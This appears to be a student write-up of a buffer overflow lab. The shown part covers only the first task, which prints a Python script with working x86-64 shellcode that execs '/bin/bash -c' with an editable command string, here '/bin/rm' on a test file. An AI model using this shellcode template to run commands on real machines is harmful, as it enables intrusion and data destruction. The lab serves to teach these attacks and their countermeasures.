# Buffer Over Flow Lab

## Description

In this lab we are going to learn about a very famous type of attacks, buffer over flow attacks. We will be given four servers where in each there is an app with this vulnerability and we need to use that vulnerability to gain root access to these four machines. Then we are going to learn about countermeasures that are used to prevent such attacks.

## Task 1

In the `shellcode` folder of the lab files we have  `call_shellcode.c` which is the source code of a program that runs the `codefile_32` assembly (`codefile_64` assembly depending on the gcc build flags); on the other hand we have two python scripts that create this assembly files. This assembly files basically run a shell inside the host. Now the task is to modify one of the python scripts in such a way that `call_shellcode` is run, a file in the directory is deleted. The script below does exactly that; it removes a file named `test-remove.txt` from our directory:

```python
#!/usr/bin/python3
import sys

# You can use this shellcode to run any command you want
shellcode = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same. 
   # The * in this line serves as the position marker         * 
   "/bin/rm  test-remove.txt                                  *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

content = bytearray(200)
content[0:] = shellcode

# Save the binary code to file
with open('codefile_64', 'wb') as f:
  f.write(content)
```
And here is the result:
![a](img)

## Task 2
